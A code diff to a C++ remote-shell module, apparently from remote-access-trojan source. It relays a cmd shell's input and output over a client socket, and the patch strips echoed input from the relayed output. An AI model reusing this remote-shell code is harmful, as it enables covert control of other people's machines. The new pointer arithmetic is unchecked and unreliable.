@@ -14,7 +14,8 @@ CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
 	STARTUPINFO          si = {0};
 	PROCESS_INFORMATION  pi = {0}; 
 	char  strShellPath[MAX_PATH] = {0};
-
+	
+	m_UserShell = false;
     m_hReadPipeHandle	= NULL;
     m_hWritePipeHandle	= NULL;
 	m_hReadPipeShell	= NULL;
@@ -22,6 +23,7 @@ CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
     sa.nLength = sizeof(sa);
     sa.lpSecurityDescriptor = NULL; 
     sa.bInheritHandle = TRUE;
+
 
 	//创建管道，管道用于获取cmd的数据信息
     if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
@@ -112,10 +114,10 @@ void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		NotifyDialogIsOpen();
 		return;
 	}
-	
-	unsigned long	ByteWrite;
+
+	m_UserShell = TRUE;
 	//写入管道数据
-	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
+	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &m_ByteWrite, NULL);
 }
 
 
@@ -123,6 +125,7 @@ void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
 {
 	unsigned long   BytesRead = 0;
+	unsigned long   BytesReads = 0;
 	char	ReadBuff[1024];
 	DWORD	TotalBytesAvail;
 	CShellManager *pThis = (CShellManager *)lparam;
@@ -137,11 +140,25 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
 			if (BytesRead <= 0)
 				break;
 			memset(ReadBuff, 0, sizeof(ReadBuff));
+			LPBYTE lpBuffers = NULL;
 			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
 			//读取管道数据
 			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
+			
+			if (pThis->m_UserShell)
+			{
+				lpBuffers = &lpBuffer[pThis->m_ByteWrite - 2];
+				BytesReads = BytesRead - pThis->m_ByteWrite + 2;
+			}
+			else
+			{
+				lpBuffers = lpBuffer;
+				BytesReads = BytesRead;
+			}
+			pThis->m_UserShell = false;
+
 			// 发送数据 ---->OnReceive会接受数据
-			pThis->Send(lpBuffer, BytesRead);
+			pThis->Send(lpBuffers, BytesReads);
 			LocalFree(lpBuffer);
 		}
 	}
